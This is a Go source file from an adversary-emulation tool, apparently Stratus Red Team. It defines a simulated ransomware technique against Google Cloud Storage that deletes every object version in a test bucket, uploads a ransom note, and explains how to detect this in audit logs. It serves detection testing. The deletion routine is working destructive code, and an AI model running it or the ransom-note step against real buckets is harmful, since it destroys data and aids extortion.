package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"io"
	"log"
	"strings"

	"cloud.google.com/go/storage"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"google.golang.org/api/iterator"
)

//go:embed main.tf
var tf []byte

const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with rick@astley.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.`

const CodeBlock = "```"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.impact.gcs-ransomware-individual-deletion",
		FriendlyName: "GCS Ransomware through individual file deletion",
		Description: `
Simulates GCS ransomware activity that empties a Cloud Storage bucket through individual object deletion, then uploads a ransom note.

Warm-up:

- Create a Cloud Storage bucket, with object versioning enabled
- Create a number of objects in the bucket, with random content and extensions

Detonation:

- List all available objects and their versions in the bucket
- Delete all objects in the bucket one by one, including all noncurrent versions, using [objects.delete](https://cloud.google.com/storage/docs/json_api/v1/objects/delete)
- Upload a ransom note to the bucket

Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket.

References:

- [Detecting and Hunting for Cloud Ransomware Part 2: GCP GCS (Panther)](https://panther.com/blog/detecting-and-hunting-for-cloud-ransomware-part-2-gcp-gcs)
- [Mitigate ransomware attacks using Google Cloud (Google Cloud Architecture Center)](https://cloud.google.com/architecture/security/mitigating-ransomware-attacks)
`,
		Detection: `
You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.
This can be done through GCS [Data Access audit logs](https://cloud.google.com/storage/docs/audit-logging) by monitoring for high volumes of <code>storage.objects.delete</code> events
attributed to a single principal in a short time window.

Note that GCS Data Access logs are not enabled by default and must be [explicitly enabled](https://cloud.google.com/storage/docs/audit-logging#enabling) at the project or organization level.

Sample audit log event for <code>storage.objects.delete</code>, shortened for readability:

` + CodeBlock + `json hl_lines="4 6 11"
{
  "protoPayload": {
    "serviceName": "storage.googleapis.com",
    "methodName": "storage.objects.delete",
    "resourceName": "projects/_/buckets/target-bucket/objects/target-object-key",
    "authorizationInfo": [
      { "permission": "storage.objects.delete", "granted": true }
    ],
    "authenticationInfo": {
      "principalEmail": "attacker@example.com"
    }
  },
  "resource": {
    "type": "gcs_bucket",
    "labels": {
      "bucket_name": "target-bucket"
    }
  }
}
` + CodeBlock + `
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	ctx := context.Background()

	client, err := storage.NewClient(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create GCS client: %w", err)
	}
	defer client.Close()

	log.Println("Simulating a ransomware attack on bucket " + bucketName)

	if err := downloadAllObjects(ctx, client, bucketName); err != nil {
		return fmt.Errorf("failed to download bucket objects: %w", err)
	}

	if err := removeAllObjects(ctx, client, bucketName); err != nil {
		return fmt.Errorf("failed to remove objects in the bucket: %w", err)
	}

	log.Println("Uploading fake ransom note")
	if err := uploadObject(ctx, client, bucketName, RansomNoteFilename, strings.NewReader(RansomNoteContents)); err != nil {
		return fmt.Errorf("failed to upload ransom note to the bucket: %w", err)
	}

	return nil
}

func downloadAllObjects(ctx context.Context, client *storage.Client, bucketName string) error {
	bucket := client.Bucket(bucketName)
	it := bucket.Objects(ctx, &storage.Query{Versions: true})
	count := 0
	for {
		attrs, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			return fmt.Errorf("unable to list bucket objects: %w", err)
		}
		reader, err := bucket.Object(attrs.Name).Generation(attrs.Generation).NewReader(ctx)
		if err != nil {
			return fmt.Errorf("unable to read object %s (generation %d): %w", attrs.Name, attrs.Generation, err)
		}
		_, err = io.Copy(io.Discard, reader)
		reader.Close()
		if err != nil {
			return fmt.Errorf("unable to download object %s: %w", attrs.Name, err)
		}
		count++
	}
	log.Printf("Downloaded %d object versions from the bucket", count)
	return nil
}

func removeAllObjects(ctx context.Context, client *storage.Client, bucketName string) error {
	bucket := client.Bucket(bucketName)
	it := bucket.Objects(ctx, &storage.Query{Versions: true})
	type versionedObject struct {
		Name       string
		Generation int64
	}
	var objects []versionedObject
	for {
		attrs, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			return fmt.Errorf("unable to list bucket objects: %w", err)
		}
		objects = append(objects, versionedObject{Name: attrs.Name, Generation: attrs.Generation})
	}
	log.Printf("Found %d object versions to delete", len(objects))
	log.Println("Removing all objects one by one individually")
	for _, object := range objects {
		err := bucket.Object(object.Name).Generation(object.Generation).Delete(ctx)
		if err != nil {
			return fmt.Errorf("unable to delete file %s (generation %d): %w", object.Name, object.Generation, err)
		}
	}
	log.Println("Successfully removed all objects from the bucket")
	return nil
}

func uploadObject(ctx context.Context, client *storage.Client, bucketName, objectName string, content io.Reader) error {
	writer := client.Bucket(bucketName).Object(objectName).NewWriter(ctx)
	if _, err := io.Copy(writer, content); err != nil {
		writer.Close()
		return fmt.Errorf("unable to write object %s: %w", objectName, err)
	}
	return writer.Close()
}
